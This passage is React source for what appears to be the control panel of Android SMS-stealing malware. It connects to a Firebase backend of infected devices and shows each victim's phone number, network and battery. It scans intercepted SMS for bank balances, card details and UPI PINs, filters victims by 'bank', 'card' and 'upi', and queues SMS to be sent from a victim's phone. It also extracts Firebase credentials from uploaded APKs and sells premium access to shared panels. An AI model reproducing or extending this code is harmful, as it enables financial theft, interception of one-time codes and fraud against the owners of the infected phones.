                {sum.success.length>0 && <div style={{padding:"0 12px 8px",maxHeight:130,overflowY:"auto"}}>{sum.success.map((s,i)=><div key={i} className="mono a-in" style={{fontSize:10,color:"#34d399",padding:"3px 0"}}>✓ {s.url}{s.devices?` · ${s.devices}d`:""}</div>)}</div>}
                {sum.failed.length>0 && <div style={{maxHeight:140,overflowY:"auto",padding:"0 12px 12px"}}>{sum.failed.map((f,i)=>(<div key={i} style={{padding:"6px 10px",borderRadius:8,background:"rgba(244,63,94,.08)",border:"1px solid rgba(244,63,94,.2)",marginBottom:6}} className="a-in"><p className="mono" style={{fontSize:10,color:"var(--muted)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{f.url||"Invalid input"}</p><p style={{fontSize:9,color:"#fb7185",marginTop:2}}>{f.reason}</p></div>))}</div>}
              </div>
            ))}
          </div>}
        </>}
        {show && <div className="a-up">
          <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:18}}>
            <button onClick={()=>{setShow(false);setErr("");resetApk();setUrl("");setKey("");}} className="ibtn" style={{padding:7}}>{Ic.chevL(14)}</button>
            <h3 style={{fontSize:15,fontWeight:600}}>New Firebase Account</h3>
          </div>
          <div style={{marginBottom:18}}>
            <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:8}}>Extract from APK / ZIP (optional)</p>
            {!apkResult&&!apkBusy && <label htmlFor="apk-in" onDrop={e=>{e.preventDefault();onApk(e.dataTransfer.files[0]);}} onDragOver={e=>e.preventDefault()} className="lift"
              style={{display:"flex",flexDirection:"column",alignItems:"center",gap:8,padding:"20px 16px",borderRadius:14,border:"2px dashed rgba(139,92,246,.3)",cursor:"pointer"}}>
              <div style={{width:40,height:40,borderRadius:12,background:"rgba(139,92,246,.08)",border:"1px solid var(--border)",display:"flex",alignItems:"center",justifyContent:"center",color:"#a78bfa"}}>{Ic.upload(20)}</div>
              <div style={{textAlign:"center"}}><p style={{fontSize:13,fontWeight:600}}>Upload APK / ZIP File</p><p style={{fontSize:10,color:"var(--muted-2)",marginTop:2}}>Auto-extracts Firebase URL & API Key</p></div>
              <input id="apk-in" ref={fileRef} type="file" accept=".apk,.zip" onChange={e=>onApk(e.target.files[0])} style={{display:"none"}}/>
            </label>}
            {apkBusy && <div className="a-scale" style={{display:"flex",flexDirection:"column",alignItems:"center",gap:10,padding:"22px 16px",borderRadius:14,border:"1px solid var(--border)"}}>
              <span className="spin"/><p style={{fontSize:13,fontWeight:600,color:"#c4b5fd"}}>Scanning file…</p><p className="mono" style={{fontSize:10,color:"var(--muted-2)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:240}}>{apkFile}</p>
            </div>}
            {apkErr && <div className="a-scale" style={{display:"flex",alignItems:"center",gap:8,padding:12,borderRadius:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185"}}>{Ic.alert(14)}<p style={{fontSize:11,flex:1}}>{apkErr}</p><button onClick={resetApk}>{Ic.x(14)}</button></div>}
            {apkResult && !apkBusy && <div className="a-scale" style={{borderRadius:14,overflow:"hidden",border:"1px solid rgba(52,211,153,.35)",background:"rgba(52,211,153,.06)"}}>
              <div style={{display:"flex",alignItems:"center",gap:8,padding:"10px 12px",borderBottom:"1px solid rgba(52,211,153,.2)"}}>{Ic.fileSearch(14)}<span style={{fontSize:11,fontWeight:600,color:"#34d399"}}>Extracted</span><button onClick={resetApk} style={{marginLeft:"auto",color:"var(--muted-2)"}}>{Ic.x(14)}</button></div>
              <div style={{padding:12,display:"flex",flexDirection:"column",gap:10}}>
                {[["Firebase URL",apkResult.firebaseUrl],["API Key",apkResult.apiKey],apkResult.projectId&&["Project ID",apkResult.projectId]].filter(Boolean).map(([k,v])=>(
                  <div key={k}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.1em",color:"var(--muted-2)",marginBottom:4}}>{k}</p>
                    <div style={{display:"flex",alignItems:"center",gap:6,padding:"6px 10px",borderRadius:8,background:"rgba(5,5,10,.5)",border:"1px solid var(--border)"}}>
                      <span className="mono" style={{fontSize:10,color:"#6ee7b7",flex:1,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{v||"Not found"}</span>
                      {v&&<CopyBtn text={v}/>}
                    </div></div>))}
              </div>
            </div>}
          </div>
          <div style={{display:"flex",flexDirection:"column",gap:14}}>
            <div><label style={{fontSize:11,fontWeight:600,color:"var(--muted)",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:6,display:"block"}}>Firebase Database URL</label>
              <input className="inp mono" value={url} onChange={e=>setUrl(e.target.value)} placeholder="https://your-project.firebaseio.com"/></div>
            <div><label style={{fontSize:11,fontWeight:600,color:"var(--muted)",textTransform:"uppercase",letterSpacing:"0.1em",marginBottom:6,display:"block"}}>Authentication Key / Secret</label>
              <input className="inp mono" value={key} onChange={e=>setKey(e.target.value)} placeholder="Your Firebase secret key"/></div>
          </div>
          <div style={{display:"flex",gap:10,marginTop:20}}>
            <button onClick={submit} disabled={busy} className="btn btn-primary" style={{flex:1}}>{busy?<><span className="spin" style={{borderTopColor:"#fff"}}/>Connecting…</>:<>{Ic.zap(15)}Save & Connect</>}</button>
            <button onClick={()=>{setShow(false);setErr("");resetApk();setUrl("");setKey("");}} className="btn btn-ghost">Cancel</button>
          </div>
        </div>}
        {err && <p className="a-up" style={{textAlign:"center",fontSize:12,color:"#fb7185",marginTop:14}}>{err}</p>}
      </div>
      <div style={{display:"flex",justifyContent:"center",marginTop:20}}><TGButton label="Chat with us on Telegram"/></div>
      <p style={{textAlign:"center",fontSize:11,color:"var(--muted-2)",marginTop:14}}><span className="grad-text" style={{fontWeight:600}}>{BRAND}</span> · All connections logged</p>
    </div>

    {/* Premium Modal */}
    {showPremium && <div className="ovl" onClick={()=>setShowPremium(false)}>
      <div className="glass a-scale" style={{borderRadius:20,padding:26,maxWidth:440,width:"100%",background:"linear-gradient(135deg, rgba(251,191,36,.08), rgba(20,18,40,.98))",border:"1px solid rgba(251,191,36,.4)"}} onClick={e=>e.stopPropagation()}>
        <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:20}}>
          <div style={{width:44,height:44,borderRadius:14,background:"linear-gradient(135deg,#fbbf24,#f97316)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:22,boxShadow:"0 8px 24px rgba(251,191,36,.5)"}}>👑</div>
          <div><h3 style={{fontSize:16,fontWeight:800,color:"#fbbf24",letterSpacing:"0.02em"}}>PREMIUM ACCESS</h3><p style={{fontSize:11,color:"var(--muted)"}}>Enter your access key to unlock</p></div>
          <button onClick={()=>setShowPremium(false)} className="ibtn" style={{marginLeft:"auto",padding:6}}>{Ic.x(14)}</button>
        </div>
        <div style={{marginBottom:16}}>
          <label style={{fontSize:10,fontWeight:700,letterSpacing:"0.15em",textTransform:"uppercase",color:"#fbbf24",marginBottom:8,display:"block"}}>Access Key</label>
          <input className="inp mono" type="text" value={premiumKey} onChange={e=>setPremiumKey(e.target.value)}
            onKeyDown={e=>{if(e.key==="Enter") verifyPremium();}}
            placeholder="Enter premium key"
            style={{textAlign:"center",letterSpacing:"0.15em",fontWeight:700,textTransform:"uppercase",borderColor:"rgba(251,191,36,.35)"}}
            autoFocus/>
        </div>
        {premiumErr && <div className="a-in" style={{marginBottom:14,padding:10,borderRadius:10,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185",fontSize:11,textAlign:"center"}}>{premiumErr}</div>}
        <button onClick={verifyPremium} disabled={premiumLoading} className="btn" style={{width:"100%",padding:14,background:"linear-gradient(135deg,#fbbf24,#f97316)",color:"#fff",border:"1px solid rgba(251,191,36,.5)",fontWeight:800,letterSpacing:"0.08em",fontSize:13}}>
          {premiumLoading?<><span className="spin" style={{borderTopColor:"#fff"}}/>VERIFYING…</>:"UNLOCK PREMIUM →"}
        </button>
        <p style={{fontSize:10,color:"var(--muted-2)",textAlign:"center",marginTop:12,lineHeight:1.5}}>Premium access unlocks all shared panels. Key is case-sensitive.</p>
      </div>
    </div>}

    {shareLink && <div className="ovl" onClick={()=>setShareLink("")}>
      <div className="glass a-scale" style={{borderRadius:20,padding:24,maxWidth:440,width:"100%"}} onClick={e=>e.stopPropagation()}>
        <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:16}}>
          <div style={{display:"flex",gap:10,alignItems:"center"}}>
            <div style={{width:34,height:34,borderRadius:10,background:"rgba(34,211,238,.12)",border:"1px solid rgba(34,211,238,.35)",display:"flex",alignItems:"center",justifyContent:"center",color:"#a5f3fc"}}>{Ic.link(16)}</div>
            <div><h3 style={{fontSize:14,fontWeight:600}}>Share Connection</h3><p style={{fontSize:11,color:"var(--muted)"}}>Anyone with this link can connect</p></div>
          </div>
          <button onClick={()=>setShareLink("")} className="ibtn" style={{padding:6}}>{Ic.x(14)}</button>
        </div>
        <div style={{display:"flex",gap:8,padding:12,borderRadius:12,background:"rgba(5,5,10,.5)",border:"1px solid var(--border)",marginBottom:14}}>
          <span className="mono" style={{fontSize:11,color:"var(--muted)",flex:1,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",userSelect:"all"}}>{shareLink}</span>
          <button onClick={()=>{navigator.clipboard.writeText(shareLink);setCopied(true);setTimeout(()=>setCopied(false),1800);}} className="btn"
            style={{padding:"6px 12px",fontSize:11,background:copied?"rgba(52,211,153,.15)":"rgba(34,211,238,.12)",border:"1px solid "+(copied?"rgba(52,211,153,.4)":"rgba(34,211,238,.4)"),color:copied?"#34d399":"#a5f3fc"}}>
            {copied?<>{Ic.check(12)}Copied!</>:<>{Ic.copy(12)}Copy</>}
          </button>
        </div>
        <div style={{display:"flex",gap:8,padding:12,borderRadius:12,background:"rgba(251,191,36,.08)",border:"1px solid rgba(251,191,36,.25)"}}>{Ic.alert(14)}<p style={{fontSize:11,color:"#fcd34d"}}>Contains Firebase credentials. Share only with trusted people.</p></div>
      </div>
    </div>}
  </div>;
}

/* ============ DASHBOARD ============ */
function Dashboard({fbUrl,fbKey,onLogout}){
  const [devices,setDevices]=useState([]);
  const [loading,setLoading]=useState(true);
  const [scanning,setScanning]=useState(false);
  const [filter,setFilter]=useState("all");
  const [search,setSearch]=useState("");
  const [selected,setSelected]=useState(null);
  const [msg,setMsg]=useState("");
  const [now,setNow]=useState(new Date());
  const [err,setErr]=useState("");
  const [pinnedIds,setPinnedIds]=useState(()=>loadPinnedDevices());
  const prev=useRef(0);const ref=useRef([]);const cache=useRef(new Map());
  const toast=useCallback(m=>{setMsg(m);setTimeout(()=>setMsg(""),2800)},[]);
  ref.current=devices;
  const togglePinDevice=useCallback((id)=>{setPinnedIds(prev=>{const next=prev.includes(id)?prev.filter(x=>x!==id):[...prev,id];savePinnedDevices(next);return next;});},[]);

  const load=useCallback(async (showLoad=false)=>{
    if(showLoad) setLoading(true);
    try{const raw=await fbGet(fbUrl,fbKey,"clients");const rows=parseDevices(raw);
      setDevices(p=>{const old=new Map(p.map(d=>[d.id,d]));return rows.map(d=>{const prev=old.get(d.id);return {...d,smsAnalysis:prev?.smsAnalysis,lastSmsTs:prev?.lastSmsTs,isActive:prev?.isActive};});});
      setErr("");
      if(prev.current>0&&rows.length>prev.current) toast("🔔 New device connected!");
      prev.current=rows.length;
    }catch(e){const m=e.message||String(e);setErr(m.includes("PERMISSION_DENIED")?"Permission Denied — Use Database Secret key (not API key).":"Connection error: "+m.slice(0,120));}
    finally{setLoading(false);}
  },[fbUrl,fbKey,toast]);

  /* ⚡ PATCH: limitToLast 40 → 200 */
  const scan=useCallback(async (force=false)=>{
    const cur=ref.current;if(!cur.length) return;
    const now=Date.now();
    const work=cur.filter(d=>{if(force) return true;const c=cache.current.get(d.id);if(!c) return true;if(c.ts && now-c.ts < 60000) return false;return true;});
    if(!work.length) return;
    setScanning(true);
    try{
      const batchSize = PERF.isLowEnd ? 1 : 3;
      for(let i=0;i<work.length;i+=batchSize){
        const batch=work.slice(i,i+batchSize);
        await Promise.all(batch.map(async d=>{
          try{
            const raw=await fbGet(fbUrl,fbKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"200"});
            const msgs=parseMessages(raw);
            const a=analyze(msgs);
            const lastTs=getLastSmsTs(msgs);
            const active=isRecentSms(msgs,2);
            cache.current.set(d.id,{smsAnalysis:a,lastSmsTs:lastTs,isActive:active,ts:Date.now()});
            setDevices(p=>p.map(x=>x.id===d.id?{...x,smsAnalysis:a,lastSmsTs:lastTs,isActive:active}:x));
          }catch{cache.current.set(d.id,{smsAnalysis:{bankBalances:[],cards:[],phoneNumbers:[],networks:[]},lastSmsTs:0,isActive:false,ts:Date.now()});}
        }));
      }
    }finally{setScanning(false);}
  },[fbUrl,fbKey]);

  useEffect(()=>{
    load(true);
    const t1=setInterval(()=>load(false),45000);
    const t2=setInterval(()=>scan(true),120000);
    let t3=null;
    if(!PERF.isLowEnd) t3=setInterval(()=>setNow(new Date()),60000);
    return ()=>{clearInterval(t1);clearInterval(t2);if(t3) clearInterval(t3);};
  },[]);
  useEffect(()=>{if(!devices.length) return;const timer=setTimeout(()=>scan(false),1000);return ()=>clearTimeout(timer);},[devices.length,scan]);

  const filtered=useMemo(()=>{
    const qRaw=search.trim().toLowerCase();const qNum=qRaw.replace(/[^0-9]/g,"");
    return devices.filter(d=>{
      if(filter==="online"&&!d.status) return false;
      if(filter==="offline"&&d.status) return false;
      if(filter==="upi"&&!d.upipin) return false;
      if(filter==="bank"&&!d.smsAnalysis?.bankBalances.length) return false;
      if(filter==="card"&&!d.smsAnalysis?.cards.length) return false;
      if(!qRaw) return true;
      const numStr=String(d.phoneNumber||"").replace(/[^0-9]/g,"");
      const smsNums=(d.smsAnalysis?.phoneNumbers||[]).join(" ").replace(/[^0-9]/g,"");
      return d.name.toLowerCase().includes(qRaw)||d.id.toLowerCase().includes(qRaw)||(qNum&&(numStr.includes(qNum)||smsNums.includes(qNum)));
    }).sort((a,b)=>{const pa=pinnedIds.includes(a.id),pb=pinnedIds.includes(b.id);if(pa!==pb) return pb?1:-1;if(filter==="online") return Number(b.status)-Number(a.status);return b.id.localeCompare(a.id);});
  },[devices,filter,search,pinnedIds]);

  const online=devices.filter(d=>d.status).length;
  const offline=devices.length-online;
  const bankSms=devices.filter(d=>d.smsAnalysis?.bankBalances.length).length;
  const cards=devices.filter(d=>d.smsAnalysis?.cards.length).length;

  return <div className="app a-in" style={{minHeight:"100vh",display:"flex",flexDirection:"column"}}>
    <header className="head-glow" style={{position:"sticky",top:0,zIndex:40,background:"rgba(4,4,10,.92)"}}>
      <div style={{maxWidth:1400,margin:"0 auto",padding:"12px 22px",display:"flex",alignItems:"center",gap:14,flexWrap:"wrap"}}>
        <div style={{display:"flex",alignItems:"center",gap:10,flexShrink:0}}>
          <div style={{width:34,height:34,borderRadius:11,background:"linear-gradient(135deg,#8b5cf6,#22d3ee)",display:"flex",alignItems:"center",justifyContent:"center"}}>{Ic.zap(16)}</div>
          <span className="grad-text" style={{fontWeight:700,fontSize:15}}>{BRAND}</span>
          <span className="badge" style={{background:"rgba(139,92,246,.1)",borderColor:"rgba(139,92,246,.3)",color:"#c4b5fd"}}>PANEL</span>
        </div>
        <div style={{position:"relative",flex:1,minWidth:200,maxWidth:380}}>
          <span style={{position:"absolute",left:12,top:"50%",transform:"translateY(-50%)",color:"var(--muted-2)"}}>{Ic.search(15)}</span>
          <input value={search} onChange={e=>setSearch(e.target.value)} className="inp" placeholder="Search by name or number…" style={{paddingLeft:36,padding:"10px 14px 10px 36px"}}/>
        </div>
        <div style={{marginLeft:"auto",display:"flex",alignItems:"center",gap:10,flexWrap:"wrap"}}>
          <div style={{display:"flex",alignItems:"center",gap:8,padding:"7px 14px",borderRadius:999,background:"rgba(52,211,153,.08)",border:"1px solid rgba(52,211,153,.3)"}}>
            <span className="pdot" style={{width:7,height:7,borderRadius:"50%",background:"#34d399",display:"inline-block"}}/>
            <span style={{fontSize:11,fontWeight:600,color:"#34d399"}}>Live</span>
          </div>
          <TGButton label="Telegram"/>
          {!PERF.isLowEnd && <div style={{display:"flex",alignItems:"center",gap:6,padding:"7px 12px",borderRadius:999,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>{Ic.clock(13)}<span className="mono" style={{fontSize:11,fontWeight:700,color:"var(--muted)"}}>{now.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit",hour12:false})}</span></div>}
          <button onClick={()=>{if(confirm("Logout?")) onLogout();}} className="btn btn-ghost" style={{padding:"8px 14px",fontSize:11}}>{Ic.logout(13)} Logout</button>
        </div>
      </div>
    </header>
    {err && <div className="a-up" style={{maxWidth:1400,margin:"10px auto 0",padding:"0 22px",width:"100%"}}>
      <div style={{display:"flex",gap:10,padding:12,borderRadius:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.3)",color:"#fb7185"}}>{Ic.alert(15)}<p style={{fontSize:12,flex:1,lineHeight:1.5}}>{err}</p><button onClick={()=>setErr("")}>{Ic.x(14)}</button></div>
    </div>}
    <div style={{borderBottom:"1px solid var(--border)",background:"rgba(4,4,10,.6)"}}>
      <div style={{maxWidth:1400,margin:"0 auto",padding:"14px 22px",display:"flex",alignItems:"center",gap:26,flexWrap:"wrap"}}>
        <div style={{display:"flex",gap:24,flexWrap:"wrap"}}>
          <StatTile label="Total" value={devices.length} delay={0}/>
          <StatTile label="Online" value={online} color="#34d399" delay={0.05}/>
          <StatTile label="Offline" value={offline} color="var(--muted)" delay={0.1}/>
          <StatTile label="Bank SMS" value={bankSms} color="#34d399" delay={0.15}/>
          {cards>0&&<StatTile label="Cards" value={cards} color="#c084fc" delay={0.2}/>}
        </div>
        <div style={{marginLeft:"auto",display:"flex",gap:8,alignItems:"center",flexWrap:"wrap"}}>
          {["all","online","offline","upi","bank","card"].map(f=><button key={f} onClick={()=>setFilter(f)} className={"chip"+(filter===f?" active":"")}>{f}</button>)}
          <button onClick={()=>load(true)} className="ibtn" style={{padding:9}}>{Ic.refresh(14)}</button>
        </div>
      </div>
    </div>
    <main style={{flex:1,maxWidth:1400,margin:"0 auto",width:"100%",padding:"22px"}}>
      {loading ? <div style={{display:"flex",flexDirection:"column",gap:16}}>
        <div style={{display:"flex",alignItems:"center",gap:10}}><span className="spin"/><span style={{fontSize:12,color:"var(--muted)"}}>Connecting to Firebase…</span></div>
        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(280px,1fr))",gap:16}}>{Array.from({length:6}).map((_,i)=><div key={i} className="shim" style={{height:200}}/>)}</div>
      </div>
      : devices.length===0 ? <div className="a-up" style={{textAlign:"center",padding:"70px 20px"}}>
          <div className="glass" style={{width:70,height:70,borderRadius:20,display:"inline-flex",alignItems:"center",justifyContent:"center",marginBottom:16,color:"var(--muted-2)"}}>{Ic.shield(32)}</div>
          <p style={{fontSize:15,fontWeight:700,color:"var(--muted)"}}>No devices connected</p>
          <p style={{fontSize:12,color:"var(--muted-2)",marginTop:6}}>Waiting for devices to register…</p>
        </div>
      : <>
          {scanning && <div className="a-in" style={{display:"flex",alignItems:"center",gap:10,marginBottom:14,padding:"8px 14px",borderRadius:12,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)",width:"fit-content"}}><span className="spin sm"/><span style={{fontSize:11,color:"var(--muted)"}}>Scanning SMS…</span></div>}
          <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(290px,1fr))",gap:16}}>
            {filtered.map((d,i)=><DeviceCard key={d.id} dev={d} delay={Math.min(i*0.03,0.4)} onClick={()=>setSelected(d)} pinned={pinnedIds.includes(d.id)} onTogglePin={togglePinDevice}/>)}
            {filtered.length===0&&<div style={{gridColumn:"1/-1",padding:"70px 20px",textAlign:"center",color:"var(--muted-2)",fontSize:12}}>No devices match your filter</div>}
          </div>
        </>}
    </main>
    <Toast msg={msg}/>
    {selected && <DeviceDrawer dev={selected} fbUrl={fbUrl} fbKey={fbKey} onClose={()=>setSelected(null)} onDelete={()=>{setSelected(null);load(true);}} showToast={toast}/>}
  </div>;
}

/* ============ DEVICE CARD ============ */
const DeviceCard=React.memo(function DeviceCard({dev,onClick,delay=0,pinned,onTogglePin}){
  const bank=dev.smsAnalysis?.bankBalances?.[0];
  const card=dev.smsAnalysis?.cards?.[0];
  const phoneRaw=dev.phoneNumber&&dev.phoneNumber!=="—"?dev.phoneNumber:(dev.smsAnalysis?.phoneNumbers?.[0]||"—");
  const phoneShow=cleanPhone(phoneRaw);
  const net=dev.provider&&dev.provider!=="—"?dev.provider:(dev.smsAnalysis?.networks?.[0]||null);
  const [copied,setCopied]=useState(false);
  const recentSmsActive = dev.isActive === true;
  const lastSmsTs = dev.lastSmsTs || 0;
  const activeLabel = lastSmsTs ? timeAgo(lastSmsTs) : "";
  const onCopyPhone=(e)=>{e.stopPropagation();if(!phoneShow||phoneShow==="—") return;try{navigator.clipboard.writeText(phoneShow);}catch{}setCopied(true);setTimeout(()=>setCopied(false),1400);};
  const onPin=(e)=>{e.stopPropagation();onTogglePin&&onTogglePin(dev.id);};
  return <div onClick={onClick} className={"dev-card pop"+(pinned?" pinned":"")} style={{animationDelay:`${delay}s`}}>
    {pinned && <div className="pin-flag">{Ic.pin(11)} PINNED</div>}
    <div style={{display:"flex",alignItems:"flex-start",gap:12,marginBottom:12}}>
      <div style={{width:42,height:42,borderRadius:13,flexShrink:0,display:"flex",alignItems:"center",justifyContent:"center",background:dev.status?"rgba(52,211,153,.13)":"rgba(20,18,40,.6)",border:"1px solid "+(dev.status?"rgba(52,211,153,.35)":"var(--border)"),color:dev.status?"#34d399":"var(--muted-2)"}}>{Ic.wifi(18)}</div>
      <div style={{flex:1,minWidth:0}}>
        <h3 style={{fontSize:14,fontWeight:700,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",letterSpacing:"-0.01em"}}>{dev.name}</h3>
        <p className="mono" style={{fontSize:10,color:"var(--muted-2)",marginTop:2,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{dev.id}</p>
      </div>
      <div style={{display:"flex",gap:5,flexShrink:0,alignItems:"center"}}>
        <button onClick={onPin} className="ibtn pin-btn" style={{padding:5,color:pinned?"#f472b6":undefined,background:pinned?"rgba(244,114,182,.12)":undefined,borderColor:pinned?"rgba(244,114,182,.35)":undefined}}>{pinned?Ic.pinOff(12):Ic.pin(12)}</button>
        {dev.upipin&&<span style={{color:"#fbbf24",display:"flex"}}>{Ic.zap(14)}</span>}
        {bank&&<span style={{color:"#34d399",display:"flex"}}>{Ic.rupee(14)}</span>}
        {card&&<span style={{color:"#c084fc",display:"flex"}}>{Ic.card(14)}</span>}
      </div>
    </div>
    <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
      <div><p className="lbl">Android</p><p style={{fontSize:13,fontWeight:700,color:"#c4b5fd"}}>{dev.android!=="—"?`v${dev.android.replace("v","")}`:"—"}</p></div>
      <div><p className="lbl">Battery</p><Battery percent={dev.batteryPercent}/></div>
    </div>
    <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
      <div style={{minWidth:0}}><p className="lbl">Number</p>
        <div style={{display:"flex",alignItems:"center",gap:5,minWidth:0}}>
          {recentSmsActive && (<span className="sms-bolt" title={`Recent SMS · ${activeLabel}`}>{Ic.zap(11)}</span>)}
          <p className="mono" style={{fontSize:11,color:"var(--text)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",flex:1}}>{phoneShow}</p>
          {phoneShow!=="—" && (<button onClick={onCopyPhone} className="ibtn" style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.12)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>{copied?Ic.check(11):Ic.copy(11)}</button>)}
        </div>
      </div>
      {net&&<div style={{minWidth:0}}><p className="lbl">Network</p><p style={{fontSize:11,fontWeight:600,color:"#a5f3fc",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{net}</p></div>}
    </div>
    {bank&&<div style={{marginBottom:10,padding:"10px 12px",borderRadius:12,background:"linear-gradient(135deg,rgba(52,211,153,.09),rgba(52,211,153,.03))",border:"1px solid rgba(52,211,153,.25)"}}>
      <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",gap:8}}>
        <div style={{display:"flex",alignItems:"center",gap:6,minWidth:0}}>
          <span style={{color:"#34d399",display:"flex"}}>{Ic.rupee(13)}</span>
          <span style={{fontSize:10,fontWeight:600,color:"#34d399",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{bank.bankName}</span>
        </div>
        <span style={{fontSize:14,fontWeight:700,color:"#fff",fontVariantNumeric:"tabular-nums"}}>₹{fmtMoney(bank.availableBalance)}</span>
      </div>
    </div>}
    <div style={{display:"flex",alignItems:"center",gap:8,flexWrap:"wrap"}}>
      <span style={{width:8,height:8,borderRadius:"50%",flexShrink:0,background:dev.status?"#34d399":"#333"}}/>
      {dev.status ? <span style={{fontSize:11,fontWeight:600,color:"#34d399"}}>Online</span>
        : <div style={{display:"flex",alignItems:"center",gap:6,minWidth:0}}>
            <span style={{fontSize:11,color:"var(--muted)"}}>Offline</span>
            {dev.lastSeen&&<span className="mono" style={{fontSize:10,color:"var(--muted-2)",padding:"2px 7px",borderRadius:6,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>{timeAgo(dev.lastSeen)}</span>}
          </div>}
      {recentSmsActive && <span className="badge" style={{background:"rgba(251,191,36,.12)",borderColor:"rgba(251,191,36,.4)",color:"#fbbf24",fontSize:9,display:"inline-flex",alignItems:"center",gap:3}}>{Ic.zap(9)} {activeLabel}</span>}
      {dev.upipin&&<span className="badge" style={{marginLeft:"auto",background:"rgba(251,191,36,.1)",borderColor:"rgba(251,191,36,.3)",color:"#fbbf24"}}>UPI</span>}
    </div>
  </div>;
},(prev,next)=>{
  const pd=prev.dev,nd=next.dev;
  return pd.status===nd.status&&pd.batteryPercent===nd.batteryPercent&&pd.isActive===nd.isActive&&pd.lastSmsTs===nd.lastSmsTs&&pd.lastSeen===nd.lastSeen&&pd.smsAnalysis===nd.smsAnalysis&&prev.pinned===next.pinned;
});

const Row=React.memo(function Row({label,value,mono,color,delay=0,trailing,copyable}){
  const [copied,setCopied]=useState(false);
  const onCopy=(e)=>{e?.stopPropagation();const v=String(value||"");if(!v||v==="—") return;try{navigator.clipboard.writeText(v);}catch{}setCopied(true);setTimeout(()=>setCopied(false),1500);};
  return <div className="irow" style={{animationDelay:`${delay}s`}}>
    <span className="k">{label}</span>
    <span className={`v ${mono?"mono":""}`} style={{color:color||"var(--text)",fontSize:mono?11:12,display:"inline-flex",alignItems:"center",gap:6,justifyContent:"flex-end",minWidth:0}}>
      <span style={{overflow:"hidden",textOverflow:"ellipsis"}}>{value||"—"}</span>
      {copyable && value && value!=="—" && (<button onClick={onCopy} className="ibtn" style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.1)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>{copied?Ic.check(11):Ic.copy(11)}</button>)}
      {trailing}
    </span>
  </div>;
});

/* ============ DEVICE DRAWER ============ */
function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
  const [msgs,setMsgs]=useState([]);
  const [ana,setAna]=useState({bankBalances:[],cards:[],phoneNumbers:[],networks:[]});
  const [loading,setLoading]=useState(true);
  const [to,setTo]=useState("");
  const [body,setBody]=useState("");
  const [sim,setSim]=useState(1);
  const [sending,setSending]=useState(false);
  const [tab,setTab]=useState("info");
  const [refreshing,setRefreshing]=useState(false);
  const [callNum,setCallNum]=useState("");
  const [callBusy,setCallBusy]=useState(false);
  const [dateFrom,setDateFrom]=useState("");
  const [dateTo,setDateTo]=useState("");
  const [showDateFilter,setShowDateFilter]=useState(false);
  const iv=useRef(null);
  const [pinnedMsgs,setPinnedMsgs]=useLocalStorage(`pin_msgs_${dev.id}`,[]);
  const [pinnedNums,setPinnedNums]=useLocalStorage(`pin_nums_${dev.id}`,[]);

  const loadMsgs=useCallback(async (silent=false)=>{
    if(!silent) setRefreshing(true);
    try{const raw=await fbGet(fbUrl,fbKey,`messages/${dev.id}`);
      const m=parseMessages(raw);setMsgs(m);setAna(analyze(m));
    }catch{ if(!silent) setMsgs([]); }
    finally{setLoading(false);setRefreshing(false);}
  },[dev.id,fbUrl,fbKey]);

  useEffect(()=>{
    loadMsgs(true);
    const interval = PERF.isLowEnd ? 30000 : 20000;
    iv.current=setInterval(async ()=>{
      try{const raw=await fbGet(fbUrl,fbKey,`messages/${dev.id}`);
        const m=parseMessages(raw);
        setMsgs(prev=>{if(JSON.stringify(m.map(x=>x.text))!==JSON.stringify(prev.map(x=>x.text))){const a=analyze(m);setAna(a);return m;}return prev;});
      }catch{}
    },interval);
    return ()=>iv.current&&clearInterval(iv.current);
  },[loadMsgs,dev.id,fbUrl,fbKey]);

  async function send(){
    const num=String(to||"").trim().replace(/[\s\-()]/g,"");
    const txt=String(body||"").trim();
    if(!num){showToast("Enter recipient number");return;}
    if(!txt){showToast("Enter message");return;}
    if(!/^\+?[0-9]{8,15}$/.test(num)){showToast("Invalid phone number");return;}
    setSending(true);
    try{await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/sendSms`,{from:Number(sim)||1,to:num,message:txt,isSended:false});
      showToast("✉️ SMS queued successfully!");setBody("");
    }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) showToast("Firebase denied");else showToast("Send failed: "+m.slice(0,80));}
    finally{setSending(false);}
  }
  async function forwardCall(){
